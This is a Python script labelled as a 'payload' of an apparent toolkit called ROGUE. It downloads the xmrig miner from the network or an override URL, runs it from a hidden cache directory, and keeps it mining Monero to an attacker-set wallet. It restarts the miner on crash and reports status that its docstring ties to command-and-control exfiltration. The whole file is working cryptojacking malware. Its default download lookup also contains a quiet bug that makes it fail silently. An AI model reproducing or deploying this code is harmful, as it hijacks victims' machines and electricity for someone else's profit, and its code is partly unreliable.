#!/usr/bin/env python3
"""
PAYLOAD: Monero Mining Orchestrator
=====================================
Real RandomX mining requires a native binary, so this payload orchestrates
xmrig (the standard miner):

  1. locate or download xmrig (configurable URL)
  2. write a proper stratum config (pool, wallet, threads, TLS)
  3. run it supervised: auto-restart on crash, stop-file support,
     status output for C2 exfil

Config via env / edit:
  ROGUE_WALLET   (required - Monero address)
  ROGUE_POOL     (default pool.supportxmr.com:3333)
  ROGUE_THREADS  (default 1)
  XMRIG_URL      (override binary download)
  XMRIG_PATH     (use an existing xmrig binary)

Usage:
  python3 mine.py --check          # status only, no mining
  python3 mine.py --stop           # write stop file (graceful)
  python3 mine.py                  # supervised mining loop
"""

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
import urllib.request

WALLET = os.environ.get("ROGUE_WALLET", "YOUR_MONERO_WALLET_ADDRESS")
POOL = os.environ.get("ROGUE_POOL", "pool.supportxmr.com:3333")
THREADS = int(os.environ.get("ROGUE_THREADS", "1"))
XMRIG_URL = os.environ.get("XMRIG_URL", "")
XMRIG_PATH = os.environ.get("XMRIG_PATH", "")
WORK_DIR = os.path.expanduser("~/.cache/.rogue/miner")
STOP_FILE = os.path.join(WORK_DIR, ".stop")


def _default_xmrig_url():
    """Latest linux xmrig release URL (static build)."""
    try:
        with urllib.request.urlopen("https://api.github.com/repos/xmrig/xmrig/releases/latest", timeout=8) as r:
            import json as _j
            data = _j.load(r.read().decode())
        for asset in data.get("assets", []):
            name = asset.get("name", "")
            if name.endswith("linux-static-x64.tar.gz"):
                return asset.get("browser_download_url")
    except Exception:
        pass
    return ""


def find_or_fetch_xmrig():
    """Return path to a usable xmrig binary, downloading it if needed."""
    candidates = [XMRIG_PATH] if XMRIG_PATH else []
    if not candidates:
        which = shutil.which("xmrig")
        if which:
            candidates.append(which)
        local = os.path.join(WORK_DIR, "xmrig")
        candidates.append(local)
    for c in candidates:
        if c and os.path.exists(c) and os.access(c, os.X_OK):
            return c
    # download
    os.makedirs(WORK_DIR, exist_ok=True)
    url = XMRIG_URL or _default_xmrig_url()
    if not url:
        return None
    print("[+] Downloading xmrig from %s" % url)
    tarball = os.path.join(WORK_DIR, "xmrig.tar.gz")
    try:
        urllib.request.urlretrieve(url, tarball)
        subprocess.run(["tar", "xzf", tarball, "-C", WORK_DIR], check=True, timeout=60)
        for root, _, files in os.walk(WORK_DIR):
            for f in files:
                if f == "xmrig":
                    p = os.path.join(root, f)
                    os.chmod(p, 0o755)
                    return p
    except Exception as e:
        print("[!] xmrig fetch failed: %s" % e)
    return None


def write_config(xmrig_path):
    """Write config.json next to the binary (stratum + pool + wallet)."""
    cfg = {
        "autosave": False,
        "cpu": {"enabled": True, "huge-pages": True, "max-threads-hint": THREADS},
        "pools": [{
            "algo": "rx/0",
            "url": POOL,
            "user": WALLET,
            "pass": "x",
            "tls": True,
            "keepalive": True,
        }],
        "log-file": os.path.join(WORK_DIR, "miner.log"),
        "retries": 5,
        "retry-pause": 5,
        "print-time": 30,
    }
    cfg_path = os.path.join(os.path.dirname(xmrig_path), "config.json")
    with open(cfg_path, "w") as f:
        json.dump(cfg, f, indent=2)
    return cfg_path


def supervised_run(xmrig_path):
    cfg = write_config(xmrig_path)
    print("[+] Mining %s with %d thread(s) via %s" % (POOL, THREADS, xmrig_path))
    print("[+] Stop file: %s (touch it to stop gracefully)" % STOP_FILE)
    if os.path.exists(STOP_FILE):
        os.remove(STOP_FILE)
    while True:
        if os.path.exists(STOP_FILE):
            print("[+] Stop file present - exiting")
            return 0
        proc = subprocess.Popen([xmrig_path, "-c", cfg],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # supervise: poll stop file while xmrig runs
        while proc.poll() is None:
            time.sleep(2)
            if os.path.exists(STOP_FILE):
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except Exception:
                    proc.kill()
                print("[+] Stop file present - exiting")
                return 0
        rc = proc.returncode
        if rc != 0:
            print("[!] xmrig exited rc=%d - restarting in 10s" % rc)
            time.sleep(10)
        else:
            print("[+] xmrig exited cleanly")
            return 0


def status():
    log = os.path.join(WORK_DIR, "miner.log")
    hashrate = "n/a"
    if os.path.exists(log):
        with open(log, errors="replace") as f:
            tail = f.readlines()[-25:]
        for line in reversed(tail):
            if "speed" in line.lower() or "10s" in line.lower():
                hashrate = line.strip()
                break
    return {
        "payload": "mine",
        "running": "not tracked",
        "pool": POOL,
        "wallet_configured": WALLET not in ("", "YOUR_MONERO_WALLET_ADDRESS"),
        "threads": THREADS,
        "last_hashrate_line": hashrate,
        "xmrig": shutil.which("xmrig") or os.path.join(WORK_DIR, "xmrig"),
    }


def main():
    ap = argparse.ArgumentParser(description="ROGUE Monero miner orchestrator (xmrig)")
    ap.add_argument("--check", action="store_true", help="print status JSON and exit")
    ap.add_argument("--stop", action="store_true", help="write stop file")
    args = ap.parse_args()

    if args.check:
        print(json.dumps(status(), indent=2))
        return 0
    if args.stop:
        os.makedirs(WORK_DIR, exist_ok=True)
        open(STOP_FILE, "w").write("stop")
        print("[+] Stop file written")
        return 0

    if WALLET in ("", "YOUR_MONERO_WALLET_ADDRESS"):
        print("[!] Set ROGUE_WALLET to a Monero address before mining")
        return 1

    xmrig = find_or_fetch_xmrig()
    if not xmrig:
        print("[!] xmrig not found and auto-download failed - install xmrig or set XMRIG_PATH")
        return 1
    return supervised_run(xmrig)


if __name__ == "__main__":
    sys.exit(main())
